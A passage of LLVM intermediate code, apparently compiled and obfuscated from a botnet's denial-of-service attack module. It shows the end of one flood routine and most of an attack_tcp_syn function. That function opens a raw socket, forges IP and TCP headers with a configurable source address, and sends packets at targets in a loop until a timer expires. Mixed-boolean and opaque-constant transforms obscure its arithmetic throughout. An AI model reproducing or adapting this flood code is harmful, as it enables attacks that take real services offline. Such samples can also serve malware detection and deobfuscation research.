  store i32 %499, i32* %42, align 4
  %500 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %501 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %500, i32 0, i32 0
  %502 = getelementptr inbounds [6 x i8], [6 x i8]* %501, i32 0, i32 0
  %503 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %502, i8* %503, i32 4)
  %504 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %505 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %504, i32 0, i32 1
  %506 = getelementptr inbounds [6 x i8], [6 x i8]* %505, i32 0, i32 0
  %507 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %506, i8* %507, i32 4)
  %508 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %509 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %508, i32 0, i32 0
  %510 = getelementptr inbounds [6 x i8], [6 x i8]* %509, i32 0, i32 0
  %511 = getelementptr inbounds i8, i8* %510, i64 4
  %512 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %511, i8* %512, i32 2)
  %513 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %514 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %513, i32 0, i32 1
  %515 = getelementptr inbounds [6 x i8], [6 x i8]* %514, i32 0, i32 0
  %516 = getelementptr inbounds i8, i8* %515, i64 4
  %517 = bitcast i32* %42 to i8*
  %518 = getelementptr inbounds i8, i8* %517, i64 2
  call void @util_memcpy(i8* %516, i8* %518, i32 2)
  %519 = load i8, i8* %21, align 1
  %520 = icmp ne i8 %519, 0
  br i1 %520, label %521, label %528

; <label>:521:                                    ; preds = %496
  %522 = load i8*, i8** %39, align 8
  %523 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %522, i32 %523)
  %524 = load i8*, i8** %39, align 8
  %525 = load i32, i32* %20, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds i8, i8* %524, i64 %526
  store i8 0, i8* %527, align 1
  br label %528

; <label>:528:                                    ; preds = %521, %496
  %529 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %530 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %529, i32 0, i32 7
  store i16 0, i16* %530, align 2
  %531 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %532 = bitcast %struct.iphdr* %531 to i16*
  %533 = call zeroext i16 @checksum_generic(i16* %532, i32 20)
  %534 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 7
  store i16 %533, i16* %535, align 2
  %536 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 7
  store i16 0, i16* %537, align 2
  %538 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %539 = bitcast %struct.iphdr* %538 to i16*
  %540 = call zeroext i16 @checksum_generic(i16* %539, i32 20)
  %541 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 7
  store i16 %540, i16* %542, align 2
  %543 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %544 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %543, i32 0, i32 3
  store i16 0, i16* %544, align 2
  %545 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %546 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %547 = bitcast %struct.udphdr* %546 to i8*
  %548 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %549 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %548, i32 0, i32 2
  %550 = load i16, i16* %549, align 2
  %551 = load i32, i32* %20, align 4
  %552 = sext i32 %551 to i64
  %553 = add i64 8, 5698249536865828137
  %554 = add i64 %553, %552
  %555 = sub i64 %554, 5698249536865828137
  %556 = add i64 8, %552
  %557 = trunc i64 %555 to i32
  %558 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %545, i8* %547, i16 zeroext %550, i32 %557)
  %559 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %560 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %559, i32 0, i32 3
  store i16 %558, i16* %560, align 2
  %561 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %562 = load i32, i32* %11, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %561, i64 %563
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %564, i32 0, i32 0
  %566 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %565, i32 0, i32 0
  store i16 2, i16* %566, align 4
  %567 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 9
  %569 = load i32, i32* %568, align 4
  %570 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %571 = load i32, i32* %11, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %573, i32 0, i32 0
  %575 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %574, i32 0, i32 2
  %576 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %575, i32 0, i32 0
  store i32 %569, i32* %576, align 4
  %577 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %578 = load i32, i32* %11, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %577, i64 %579
  %581 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i32 0, i32 0
  %582 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %581, i32 0, i32 1
  store i16 0, i16* %582, align 2
  %583 = load i32, i32* %12, align 4
  %584 = load i8*, i8** %33, align 8
  %585 = load i32, i32* %20, align 4
  %586 = sext i32 %585 to i64
  %587 = add i64 66, 1257971565906124500
  %588 = add i64 %587, %586
  %589 = sub i64 %588, 1257971565906124500
  %590 = add i64 66, %586
  %591 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %592 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %593 = load i32, i32* %11, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i64 %594
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %595, i32 0, i32 0
  %597 = bitcast %struct.sockaddr_in* %596 to %struct.sockaddr*
  store %struct.sockaddr* %597, %struct.sockaddr** %591, align 8
  %598 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %599 = load %struct.sockaddr*, %struct.sockaddr** %598, align 8
  %600 = call i64 @sendto(i32 %583, i8* %584, i64 %589, i32 16384, %struct.sockaddr* %599, i32 16)
  br label %601

; <label>:601:                                    ; preds = %528
  %602 = load i32, i32* %11, align 4
  %603 = sub i32 0, %602
  %604 = sub i32 0, 1
  %605 = add i32 %603, %604
  %606 = sub i32 0, %605
  %607 = add nsw i32 %602, 1
  store i32 %606, i32* %11, align 4
  br label %351

; <label>:608:                                    ; preds = %351
  %609 = call i64 @time(i64* null) #6
  %610 = load i32, i32* %24, align 4
  %611 = sext i32 %610 to i64
  %612 = icmp sgt i64 %609, %611
  br i1 %612, label %613, label %614

; <label>:613:                                    ; preds = %608
  br label %615

; <label>:614:                                    ; preds = %608
  br label %350

; <label>:615:                                    ; preds = %613, %102, %96
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 19, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = sub i64 0, %99
  %103 = sub i64 0, %101
  %104 = add i64 %102, %103
  %105 = sub i64 0, %104
  %106 = add nsw i64 %99, %101
  %107 = trunc i64 %105 to i32
  store i32 %107, i32* %29, align 4
  %108 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %108, i32* %12, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %5
  br label %672

; <label>:111:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %112 = load i32, i32* %12, align 4
  %113 = bitcast i32* %11 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* %12, align 4
  %118 = call i32 @close(i32 %117)
  br label %672

; <label>:119:                                    ; preds = %111
  store i32 0, i32* %11, align 4
  br label %120

; <label>:120:                                    ; preds = %484, %119
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %491

; <label>:125:                                    ; preds = %120
  %126 = call noalias i8* @calloc(i64 128, i64 1) #6
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %13, align 8
  %132 = load i32, i32* %11, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %30, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.tcphdr*
  store %struct.tcphdr* %139, %struct.tcphdr** %31, align 8
  %140 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i64 1
  %142 = bitcast %struct.tcphdr* %141 to i8*
  store i8* %142, i8** %32, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = xor i8 15, -1
  %147 = xor i8 %145, %146
  %148 = and i8 %147, %145
  %149 = and i8 %145, 15
  %150 = xor i8 %148, -1
  %151 = xor i8 64, -1
  %152 = xor i8 -64, -1
  %153 = and i8 %150, -64
  %154 = and i8 %148, %152
  %155 = and i8 %151, -64
  %156 = and i8 64, %152
  %157 = or i8 %153, %154
  %158 = or i8 %155, %156
  %159 = xor i8 %157, %158
  %160 = or i8 %150, %151
  %161 = xor i8 %160, -1
  %162 = or i8 -64, %152
  %163 = and i8 %161, %162
  %164 = or i8 %159, %163
  %165 = or i8 %148, 64
  store i8 %164, i8* %144, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = bitcast %struct.iphdr* %166 to i8*
  %168 = load i8, i8* %167, align 4
  %169 = xor i8 -16, -1
  %170 = xor i8 %168, %169
  %171 = and i8 %170, %168
  %172 = and i8 %168, -16
  %173 = xor i8 %171, -1
  %174 = xor i8 5, -1
  %175 = xor i8 -18, -1
  %176 = and i8 %173, -18
  %177 = and i8 %171, %175
  %178 = and i8 %174, -18
  %179 = and i8 5, %175
  %180 = or i8 %176, %177
  %181 = or i8 %178, %179
  %182 = xor i8 %180, %181
  %183 = or i8 %173, %174
  %184 = xor i8 %183, -1
  %185 = or i8 -18, %175
  %186 = and i8 %184, %185
  %187 = or i8 %182, %186
  %188 = or i8 %171, 5
  store i8 %187, i8* %167, align 4
  %189 = load i8, i8* %14, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 1
  store i8 %189, i8* %191, align 1
  %192 = call zeroext i16 @htons(i16 zeroext 60) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 2
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %15, align 2
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %16, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %208

; <label>:204:                                    ; preds = %125
  %205 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %206 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 4
  store i16 %205, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %204, %125
  %209 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 6, i8* %210, align 1
  %211 = load i32, i32* %28, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 1
  %219 = load i32, i32* %218, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  %222 = load i16, i16* %18, align 2
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 0
  store i16 %223, i16* %225, align 4
  %226 = load i16, i16* %19, align 2
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = load i32, i32* %20, align 4
  %231 = trunc i32 %230 to i16
  %232 = call zeroext i16 @htons(i16 zeroext %231) #7
  %233 = zext i16 %232 to i32
  %234 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 2
  store i32 %233, i32* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = xor i16 %238, -1
  %240 = xor i16 -241, -1
  %241 = xor i16 29238, -1
  %242 = or i16 %239, %240
  %243 = or i16 29238, %241
  %244 = xor i16 %242, -1
  %245 = and i16 %244, %243
  %246 = and i16 %238, -241
  %247 = xor i16 %245, -1
  %248 = xor i16 160, -1
  %249 = xor i16 -14009, -1
  %250 = and i16 %247, -14009
  %251 = and i16 %245, %249
  %252 = and i16 %248, -14009
  %253 = and i16 160, %249
  %254 = or i16 %250, %251
  %255 = or i16 %252, %253
  %256 = xor i16 %254, %255
  %257 = or i16 %247, %248
  %258 = xor i16 %257, -1
  %259 = or i16 -14009, %249
  %260 = and i16 %258, %259
  %261 = or i16 %256, %260
  %262 = or i16 %245, 160
  store i16 %261, i16* %237, align 4
  %263 = load i8, i8* %22, align 1
  %264 = sext i8 %263 to i16
  %265 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %266 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %265, i32 0, i32 4
  %267 = load i16, i16* %266, align 4
  %268 = xor i16 1, -1
  %269 = xor i16 %264, %268
  %270 = and i16 %269, %264
  %271 = and i16 %264, 1
  %272 = shl i16 %270, 13
  %273 = xor i16 %267, -1
  %274 = xor i16 -8193, -1
  %275 = xor i16 -23155, -1
  %276 = or i16 %273, %274
  %277 = or i16 -23155, %275
  %278 = xor i16 %276, -1
  %279 = and i16 %278, %277
  %280 = and i16 %267, -8193
  %281 = xor i16 %279, -1
  %282 = xor i16 %272, -1
  %283 = xor i16 26709, -1
  %284 = and i16 %281, 26709
  %285 = and i16 %279, %283
  %286 = and i16 %282, 26709
  %287 = and i16 %272, %283
  %288 = or i16 %284, %285
  %289 = or i16 %286, %287
  %290 = xor i16 %288, %289
  %291 = or i16 %281, %282
  %292 = xor i16 %291, -1
  %293 = or i16 26709, %283
  %294 = and i16 %292, %293
  %295 = or i16 %290, %294
  %296 = or i16 %279, %272
  store i16 %295, i16* %266, align 4
  %297 = load i8, i8* %23, align 1
  %298 = sext i8 %297 to i16
  %299 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 4
  %301 = load i16, i16* %300, align 4
  %302 = xor i16 1, -1
  %303 = xor i16 %298, %302
  %304 = and i16 %303, %298
  %305 = and i16 %298, 1
  %306 = shl i16 %304, 12
  %307 = xor i16 %301, -1
  %308 = xor i16 -4097, -1
  %309 = xor i16 16928, -1
  %310 = or i16 %307, %308
  %311 = or i16 16928, %309
  %312 = xor i16 %310, -1
  %313 = and i16 %312, %311
  %314 = and i16 %301, -4097
  %315 = xor i16 %313, -1
  %316 = xor i16 %306, -1
  %317 = xor i16 6222, -1
  %318 = and i16 %315, 6222
  %319 = and i16 %313, %317
  %320 = and i16 %316, 6222
  %321 = and i16 %306, %317
  %322 = or i16 %318, %319
  %323 = or i16 %320, %321
  %324 = xor i16 %322, %323
  %325 = or i16 %315, %316
  %326 = xor i16 %325, -1
  %327 = or i16 6222, %317
  %328 = and i16 %326, %327
  %329 = or i16 %324, %328
  %330 = or i16 %313, %306
  store i16 %329, i16* %300, align 4
  %331 = load i8, i8* %24, align 1
  %332 = sext i8 %331 to i16
  %333 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = xor i16 %332, -1
  %337 = xor i16 1, -1
  %338 = xor i16 -29814, -1
  %339 = or i16 %336, %337
  %340 = or i16 -29814, %338
  %341 = xor i16 %339, -1
  %342 = and i16 %341, %340
  %343 = and i16 %332, 1
  %344 = shl i16 %342, 11
  %345 = xor i16 %335, -1
  %346 = xor i16 -2049, -1
  %347 = xor i16 9559, -1
  %348 = or i16 %345, %346
  %349 = or i16 9559, %347
  %350 = xor i16 %348, -1
  %351 = and i16 %350, %349
  %352 = and i16 %335, -2049
  %353 = xor i16 %351, -1
  %354 = xor i16 %344, -1
  %355 = xor i16 31299, -1
  %356 = and i16 %353, 31299
  %357 = and i16 %351, %355
  %358 = and i16 %354, 31299
  %359 = and i16 %344, %355
  %360 = or i16 %356, %357
  %361 = or i16 %358, %359
  %362 = xor i16 %360, %361
  %363 = or i16 %353, %354
  %364 = xor i16 %363, -1
  %365 = or i16 31299, %355
  %366 = and i16 %364, %365
  %367 = or i16 %362, %366
  %368 = or i16 %351, %344
  store i16 %367, i16* %334, align 4
  %369 = load i8, i8* %25, align 1
  %370 = sext i8 %369 to i16
  %371 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 4
  %373 = load i16, i16* %372, align 4
  %374 = xor i16 1, -1
  %375 = xor i16 %370, %374
  %376 = and i16 %375, %370
  %377 = and i16 %370, 1
  %378 = shl i16 %376, 10
  %379 = xor i16 %373, -1
  %380 = xor i16 -1025, -1
  %381 = xor i16 -23112, -1
  %382 = or i16 %379, %380
  %383 = or i16 -23112, %381
  %384 = xor i16 %382, -1
  %385 = and i16 %384, %383
  %386 = and i16 %373, -1025
  %387 = and i16 %385, %378
  %388 = xor i16 %385, %378
  %389 = or i16 %387, %388
  %390 = or i16 %385, %378
  store i16 %389, i16* %372, align 4
  %391 = load i8, i8* %26, align 1
  %392 = sext i8 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 4
  %395 = load i16, i16* %394, align 4
  %396 = xor i16 1, -1
  %397 = xor i16 %392, %396
  %398 = and i16 %397, %392
  %399 = and i16 %392, 1
  %400 = shl i16 %398, 9
  %401 = xor i16 -513, -1
  %402 = xor i16 %395, %401
  %403 = and i16 %402, %395
  %404 = and i16 %395, -513
  %405 = and i16 %403, %400
  %406 = xor i16 %403, %400
  %407 = or i16 %405, %406
  %408 = or i16 %403, %400
  store i16 %407, i16* %394, align 4
  %409 = load i8, i8* %27, align 1
  %410 = sext i8 %409 to i16
  %411 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 4
  %413 = load i16, i16* %412, align 4
  %414 = xor i16 %410, -1
  %415 = xor i16 1, -1
  %416 = xor i16 7318, -1
  %417 = or i16 %414, %415
  %418 = or i16 7318, %416
  %419 = xor i16 %417, -1
  %420 = and i16 %419, %418
  %421 = and i16 %410, 1
  %422 = shl i16 %420, 8
  %423 = xor i16 %413, -1
  %424 = xor i16 -257, -1
  %425 = xor i16 15724, -1
  %426 = or i16 %423, %424
  %427 = or i16 15724, %425
  %428 = xor i16 %426, -1
  %429 = and i16 %428, %427
  %430 = and i16 %413, -257
  %431 = and i16 %429, %422
  %432 = xor i16 %429, %422
  %433 = or i16 %431, %432
  %434 = or i16 %429, %422
  store i16 %433, i16* %412, align 4
  %435 = load i8*, i8** %32, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %32, align 8
  store i8 2, i8* %435, align 1
  %437 = load i8*, i8** %32, align 8
  %438 = getelementptr inbounds i8, i8* %437, i32 1
  store i8* %438, i8** %32, align 8
  store i8 4, i8* %437, align 1
  %439 = call i32 @rand_next()
  %440 = xor i32 %439, -1
  %441 = xor i32 15, -1
  %442 = xor i32 1521759911, -1
  %443 = or i32 %440, %441
  %444 = or i32 1521759911, %442
  %445 = xor i32 %443, -1
  %446 = and i32 %445, %444
  %447 = and i32 %439, 15
  %448 = sub i32 0, 1400
  %449 = sub i32 0, %446
  %450 = add i32 %448, %449
  %451 = sub i32 0, %450
  %452 = add i32 1400, %446
  %453 = trunc i32 %451 to i16
  %454 = call zeroext i16 @htons(i16 zeroext %453) #7
  %455 = load i8*, i8** %32, align 8
  %456 = bitcast i8* %455 to i16*
  store i16 %454, i16* %456, align 2
  %457 = load i8*, i8** %32, align 8
  %458 = getelementptr inbounds i8, i8* %457, i64 2
  store i8* %458, i8** %32, align 8
  %459 = load i8*, i8** %32, align 8
  %460 = getelementptr inbounds i8, i8* %459, i32 1
  store i8* %460, i8** %32, align 8
  store i8 4, i8* %459, align 1
  %461 = load i8*, i8** %32, align 8
  %462 = getelementptr inbounds i8, i8* %461, i32 1
  store i8* %462, i8** %32, align 8
  store i8 2, i8* %461, align 1
  %463 = load i8*, i8** %32, align 8
  %464 = getelementptr inbounds i8, i8* %463, i32 1
